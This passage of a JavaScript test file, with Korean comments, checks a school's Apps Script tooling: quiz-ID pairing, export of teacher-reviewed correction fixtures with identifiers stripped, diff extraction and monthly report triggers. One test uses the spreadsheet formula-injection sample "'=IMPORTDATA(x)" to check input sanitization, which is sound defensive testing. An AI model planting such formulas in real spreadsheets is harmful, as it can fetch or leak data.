  const pre = section('function preflightGlide()', 'function safeRun(name, fn)');
  ['퀴즈폼URL틀', '대화폼URL틀'].forEach(k => assert.ok(pre.includes(`'${k}'`), `preflight가 ${k} 부재를 경고하지 않는다`));
  // 메뉴 — 비개발자가 누를 수 있는 경로가 있어야 실제로 켜진다(편집기 드롭다운은 유호님 동선이 아니다)
  ['menuCreateQuizForm', 'menuMigrateHwForm', 'menuCreateTalkForm', 'menuDataCoverage'].forEach(m =>
    assert.ok(code.includes(`'${m}'`) && code.includes(`function ${m}()`), `시트 메뉴 항목 ${m}이(가) 없다`));
});

test('[v9.138] 퀴즈ID와 문제는 같은 선택에서 나온다 — 두 사슬이 갈라지면 조용히 오염된다', () => {
  const fn = section('function writeSharedCols_(', 'const WORLD_HP_PER');
  // 값과 ID를 각각 폴백 사슬로 고르면(구 구조) 언젠가 어긋나고, 그 오염은 2년 뒤에야 드러난다
  assert.ok(fn.includes('const qPick = qSuffix.map(s => ({ q: kv[\'오늘의퀴즈\' + s] || \'\', id: kv[\'오늘의퀴즈ID\' + s] || \'\' }))'),
    '문제와 퀴즈ID가 한 번의 선택으로 짝지어지지 않는다 — 문제와 ID가 어긋날 수 있다');
  assert.ok(fn.includes('const quizRaw = qPick.q'), '표시 문제가 선택 결과에서 오지 않는다');
  // 난이도 3종 모두 ID가 저장돼야 중·고급 학생의 응답이 문항과 연결된다(구 코드는 초급만 저장했다)
  ['초급', '중급', '고급'].forEach(lv =>
    assert.ok(code.includes("setState(st, '오늘의퀴즈ID_" + lv + "'"), `${lv} 퀴즈ID가 저장되지 않는다 — 그 난이도 학생의 응답이 문항과 끊긴다`));
  // 개인 퀴즈(AI 생성)는 contents에 없다 — 표식을 남기되 링크는 살아 있어야 한다
  assert.ok(fn.includes("pq ? 'AIQ' : qPick.id"), '개인 퀴즈에 표식이 없다 — contents ID와 섞이면 집계가 오염된다');
  // ID가 없으면 링크를 주지 않는다(해석 불능 응답 방지)
  const url = section('function quizFormUrlOf_(', '\n}\n');
  assert.ok(/if \(!tmpl \|\| !qid\) return ''/.test(url), '퀴즈ID 없이도 링크를 준다 — 무엇에 대한 답인지 모르는 행이 쌓인다');
});

/* ─────────────────────────────────────────────────────────────
 * [v9.166] 커버리지 자동 발화 + 골든셋 → 회화 앱 픽스처 내보내기
 *
 * 내보내기는 **실제 출력을 검사**한다. 「식별자를 안 담는다」는 소스 문자열로 증명할 수 없다 —
 * 담기는 곳이 출력이라서, 소스에 student_id가 안 보여도 열 인덱스 하나만 밀리면 그대로 실린다.
 * 그리고 이 실패는 되돌릴 수 없다(목적지가 git 저장소다).
 * ───────────────────────────────────────────────────────────── */

const GOLD_H = ['id', 'fb_id', 'student_id', '제출일', '원문', 'AI교정', '강사판정', '강사교정', '사유', '오류태그', '강사', 'created_at'];

function loadExport(rows) {
  const s = code.indexOf('const FIXTURE_MIN_LEN');
  assert.notEqual(s, -1, 'FIXTURE_MIN_LEN 정의를 찾지 못함');
  let saved = null;
  const sheet = { getLastRow: () => rows.length + 1, getRange: () => ({ getValues: () => rows }) };
  const ctx = {
    GOLD_HEADERS: GOLD_H,
    SpreadsheetApp: { getActiveSpreadsheet: () => ({
      getSheetByName: n => (n === 'teacher_gold' ? sheet : null),
      getSpreadsheetTimeZone: () => 'Asia/Seoul'
    }) },
    Utilities: { formatDate: () => '20260804' },
    DriveApp: { createFile: (name, content) => { saved = { name: name, content: content }; return { getUrl: () => 'https://drive/x' }; } },
    MimeType: { PLAIN_TEXT: 'text/plain' },
    Logger: { log: () => {} }
  };
  const api = new Function(...Object.keys(ctx), `${code.slice(s)}
    return { exportGoldenFixture: exportGoldenFixture_, fixtureDiff_: fixtureDiff_, 역소독_: 역소독_ };`)(...Object.values(ctx));
  return { api: api, saved: () => saved };
}

test('[v9.166] 픽스처에 식별자는 한 글자도 나가지 않는다 — 목적지가 git이라 되돌릴 수 없다', () => {
  const rows = [['GD20260804-1', 'FB-77', 'SYNK-012', '2026-08-01',
    '저가 몽골 사람입니다.', '저는 몽골 사람입니다.', '고칠 곳 있음', '저는 몽골 사람이에요.',
    '조사 오류', '조사:주격(이/가·은/는)', '바트 선생님', '2026-08-04T00:00:00']];
  const { api, saved } = loadExport(rows);
  api.exportGoldenFixture();
  const out = saved().content;
  assert.equal(out.includes('SYNK-012'), false, 'student_id가 실렸다 — 동의 v18.9의 「비식별 사용」 약속 위반');
  assert.equal(out.includes('FB-77'), false, 'fb_id 유출');
  assert.equal(out.includes('바트'), false, '강사명 유출');
  assert.equal(out.includes('2026-08-01'), false, '제출일 유출 — 소수 인원에선 날짜가 사실상 식별자로 동작한다');
  const doc = JSON.parse(out);
  assert.equal(doc.항목.length, 1);
  assert.equal(doc.항목[0].기대교정, '저는 몽골 사람이에요.', '강사교정이 있으면 그것이 정답이어야 한다(AI교정이 아니라)');
  assert.deepEqual(doc.항목[0].기대태그, ['조사:주격(이/가·은/는)']);
});

test('[v9.166] 강사가 아직 안 본 행은 픽스처가 되지 않는다 — 정답 없는 항목은 채점표가 아니다', () => {
  const rows = [
    ['GD-1', 'FB1', 'S1', 'D', '원문 하나입니다.', 'AI 교정본입니다.', '', '', '', '조사:주격(이/가·은/는)', '', ''],
    ['GD-2', 'FB2', 'S2', 'D', '저가 학생입니다.', '저는 학생입니다.', '고칠 곳 있음', '저는 학생이에요.', '', '조사:주격(이/가·은/는)', '', '']
  ];
  const { api, saved } = loadExport(rows);
  api.exportGoldenFixture();
  const doc = JSON.parse(saved().content);
  assert.equal(doc.항목.length, 1, '강사 무응답 행이 픽스처에 섞였다 — AI 출력을 정답으로 채점하게 된다');
  assert.equal(doc.항목[0].입력, '저가 학생입니다.');
});

test('[v9.166] 「AI가 맞았다」 승인 행도 담는다 — 빠지면 재현율 없는 반쪽 채점표가 된다', () => {
  const rows = [['GD-1', 'FB1', 'S1', 'D', '저는 학생입니다.', '저는 학생입니다.', 'AI가 맞음', '', '', '오류없음', '', '']];
  const { api, saved } = loadExport(rows);
  api.exportGoldenFixture();
  const doc = JSON.parse(saved().content);
  assert.equal(doc.항목.length, 1, '강사가 승인만 한 행이 통째로 버려졌다');
  assert.equal(doc.항목[0].출처, 'AI교정_강사승인');
  assert.equal(doc.항목[0].종류, '정상', '오류없음 + 원문=교정이면 거짓양성 검사용 정상 항목이다');
});

test('[v9.166] diff는 교정 지점을 뽑고, 확신이 없으면 비운다', () => {
  const { api } = loadExport([]);
  const d = api.fixtureDiff_('저가 몽골 사람입니다.', '저는 몽골 사람입니다.');
  assert.deepEqual(d.불포함, ['저가'], '틀린 어절을 못 짚었다');
  assert.deepEqual(d.포함, ['저는'], '고친 어절을 못 짚었다');
  // 1글자는 우연히 겹쳐 근거가 못 된다
  assert.equal(api.fixtureDiff_('나 밥 먹다', '나 밥 먹었다').포함.some(w => w.length < 2), false);
  // 전면 재작성이면 「이 단어가 핵심」이라는 의미를 잃는다 → 빈 배열(추측을 확신처럼 적지 않는다)
  const 전면 = api.fixtureDiff_('어제 친구 만나서 밥 먹고 영화 봤다', '어제는 친구를 만나 저녁을 먹은 뒤 영화를 보았습니다');
  assert.deepEqual(전면, { 포함: [], 불포함: [] }, '전면 재작성인데 일부 어절을 근거로 내놨다');
  assert.deepEqual(api.fixtureDiff_('', '저는 학생입니다'), { 포함: [], 불포함: [] });
});

test('[v9.166] 역소독은 수식 문자 앞의 아포스트로피만 벗긴다', () => {
  const { api } = loadExport([]);
  assert.equal(api.역소독_("'=IMPORTDATA(x)"), '=IMPORTDATA(x)', '소독 흔적이 픽스처 입력에 그대로 남는다');
  assert.equal(api.역소독_("'-저는 학생입니다"), '-저는 학생입니다');
  assert.equal(api.역소독_("'저는 학생입니다"), "'저는 학생입니다", '문장이 정당하게 쓴 아포스트로피를 벗겼다');
  assert.equal(api.역소독_(''), '');
});

test('[v9.166] 커버리지 월간 발화 — 배선·침묵 조건이 발송보다 앞에 있다', () => {
  // ① 어느 트리거에도 안 걸리면 영원히 안 돈다(골든셋과 같은 형태의 실패)
  const mj = section('function monthlyJobs()', 'function runExecReportNow');
  assert.ok(mj.includes("safeRun('dataCoverageMail', dataCoverageMonthly_)"),
    '커버리지 월간 발화가 monthlyJobs에 없다 — 계기판이 다시 사람 기억에 걸린다');
  // ② 개원 전(재원 0) 침묵과 ⚠️ 없을 때 침묵이 **메일 발송보다 앞에** 있어야 한다.
  //    순서가 뒤집히면 「정상인데 매달 오는 메일」이 되고, 그러면 정작 필요할 때 안 읽힌다.
  const fn = section('function dataCoverageMonthly_()', '\n}\n');
  const i재원 = fn.indexOf('if (!s.재원)');
  const i경고 = fn.indexOf("indexOf('⚠️') === -1");
  const i메일 = fn.indexOf('MailApp.sendEmail');
  assert.ok(i재원 > -1 && i경고 > -1 && i메일 > -1, '침묵 조건 또는 발송부가 사라졌다');
  assert.ok(i재원 < i메일 && i경고 < i메일, '침묵 조건이 발송 뒤에 있다 — 조용해야 할 때 메일이 나간다');
  assert.ok(fn.indexOf('quotaOk(1)') > -1 && fn.indexOf('quotaOk(1)') < i메일, '메일 쿼터 가드 없이 발송한다');
});
